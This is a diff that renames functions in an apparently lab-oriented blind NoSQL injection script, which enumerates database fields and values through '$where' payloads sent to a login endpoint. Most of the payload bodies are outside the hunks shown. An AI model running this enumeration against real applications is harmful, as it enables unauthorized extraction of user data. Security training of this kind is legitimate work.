@@ -49,7 +49,7 @@ def escape_regex_character(character):
         return '\\\\' + character
     return character
 
-def get_field_count(url, field_count):
+def get_number_of_fields(url, field_count):
     payload = {
         "username": "wiener",
         "password": {
@@ -59,7 +59,7 @@ def get_field_count(url, field_count):
     }
     return make_request(url, payload), payload
 
-def get_field_length(url, field_index, length):
+def get_field_lengths(url, field_index, length):
     payload = {
         "username": "wiener",
         "password": {
@@ -69,7 +69,7 @@ def get_field_length(url, field_index, length):
     }
     return make_request(url, payload), payload
 
-def get_field_value_length(url, field_name, length):
+def get_field_value_lengths(url, field_name, length):
     payload = {
         "username": "wiener",
         "password": {
@@ -89,7 +89,7 @@ def enumerate_field_lengths(url, total_fields):
         length_found = False
         
         while not length_found:
-            result, payload = get_field_length(url, current_field_index, current_length)
+            result, payload = get_field_lengths(url, current_field_index, current_length)
             progress_bar.status(payload["$where"])
             if result:
                 field_lengths_list.append(current_length)
@@ -117,7 +117,7 @@ def enumerate_field_value_lengths(url, field_names_list, field_indexes):
         value_length_found = False
         
         while not value_length_found:
-            result, payload = get_field_value_length(url, current_field_name, current_value_length)
+            result, payload = get_field_value_lengths(url, current_field_name, current_value_length)
             progress_bar.status(payload["$where"])
             
             if result:
@@ -130,7 +130,7 @@ def enumerate_field_value_lengths(url, field_names_list, field_indexes):
     progress_bar.success("Completed")
     return field_value_lengths
 
-def get_field_char(url, field_index, position, character):
+def get_fields_characters(url, field_index, position, character):
     escaped_character = escape_regex_character(character)
     
     payload = {
@@ -142,7 +142,7 @@ def get_field_char(url, field_index, position, character):
     }
     return make_request(url, payload), payload
 
-def get_field_value_char(url, field_name, position, character):
+def get_field_values_characters(url, field_name, position, character):
     escaped_character = escape_regex_character(character)
     
     payload = {
@@ -174,7 +174,7 @@ def enumerate_field_names(url, field_lengths_list):
             character_found = None
             
             for character in characters:
-                result, payload = get_field_char(url, current_field_index, current_position, character)
+                result, payload = get_fields_characters(url, current_field_index, current_position, character)
                 progress_bar.status(payload["$where"])
                 
                 if result:
@@ -221,7 +221,7 @@ def enumerate_field_values(url, field_names_list, field_value_lengths, field_ind
             character_found = None
             
             for character in characters:
-                result, payload = get_field_value_char(url, current_field_name, current_position, character)
+                result, payload = get_field_values_characters(url, current_field_name, current_position, character)
                 progress_bar.status(payload["$where"])
                 
                 if result:
@@ -250,7 +250,7 @@ def execute_nosql_enumeration(url, proxy_url=None, output_file='fields.txt'):
     count = 0
     
     while total_fields_found is None:
-        result, payload = get_field_count(url, count)
+        result, payload = get_number_of_fields(url, count)
         progress_bar.status(payload["$where"])
         
         if result:
